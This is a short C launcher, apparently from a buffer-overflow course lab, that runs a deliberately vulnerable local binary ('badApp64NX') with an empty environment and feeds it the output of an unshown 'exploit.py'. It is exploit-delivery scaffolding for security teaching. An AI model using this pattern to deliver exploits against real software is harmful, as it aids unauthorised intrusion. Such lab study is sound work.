#include <unistd.h>
#include <stdlib.h>
//compile with :gcc -o exploit_presentation exploit_presentation.c
int main(int argc, char** argv){
	system("env - /home/jake/Desktop/BSO/BufferOverflows/ASLR/badApp64NX $(python exploit.py)");
	return 0;
}
